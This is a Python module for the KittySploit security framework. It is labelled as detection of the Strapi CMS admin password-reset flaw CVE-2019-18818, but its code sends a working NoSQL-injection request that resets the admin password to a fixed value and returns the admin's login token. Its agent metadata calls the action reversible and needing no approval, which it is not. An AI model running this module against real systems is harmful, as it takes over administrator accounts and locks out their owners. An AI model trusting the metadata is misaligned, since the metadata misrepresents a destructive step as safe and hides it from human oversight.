#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""strapi CMS before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'strapi CMS <3.0.0-beta.17.5 - Admin Password Reset Detection',
        'description': 'strapi CMS before 3.0.0-beta.17.5 allows admin password resets because it mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'strapi', 'auth-bypass', 'intrusive', 'edb', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-6xc2-mj39-q599',
            'https://www.exploit-db.com/exploits/50239',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-18818',
            'https://github.com/strapi/strapi/releases/tag/v3.0.0-beta.17.5',
            'https://github.com/strapi/strapi/pull/4443',
        ],
        'cve': 'CVE-2019-18818',
    }

    def run(self):
        path = '/admin/auth/reset-password'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Origin': '{{BaseURL}}', 'Content-Type': 'application/json'}, data='{"code": {"$gt": 0}, "password": "SuperStrongPassword1", "passwordConfirmation": "SuperStrongPassword1"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"username":', '"email":', '"jwt":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='strapi CMS <3.0.0-beta.17.5 - Admin Password Reset detected', path=path)
            return True
        return False

